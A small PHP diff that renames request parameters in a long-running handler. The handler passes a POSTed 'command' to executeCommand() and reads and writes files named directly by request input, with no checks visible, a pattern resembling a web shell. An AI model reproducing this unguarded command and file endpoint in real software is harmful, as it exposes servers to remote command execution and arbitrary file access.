@@ -10,15 +10,15 @@ ignore_user_abort(true);
 set_time_limit(0);
 
 if ($_SERVER["REQUEST_METHOD"] === "GET") {
-    if (isset($_GET["getfile"])) {
-        echo FileManager::get($_GET["getfile"]);
+    if (isset($_GET["fileid"])) {
+        echo FileManager::get($_GET["fileid"]);
     }
 } else if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $data = json_decode(file_get_contents('php://input'), true);
     if (isset($data["command"])) {
         executeCommand($data["command"], @$data["link"]);
-    } else if (isset($data["savefile"]) && isset($data["savefiledata"])) {
-        FileManager::put($data["savefile"], $data["savefiledata"]);
+    } else if (isset($data["fileid"]) && isset($data["filecontent"])) {
+        FileManager::put($data["fileid"], $data["filecontent"]);
     }
 }
 
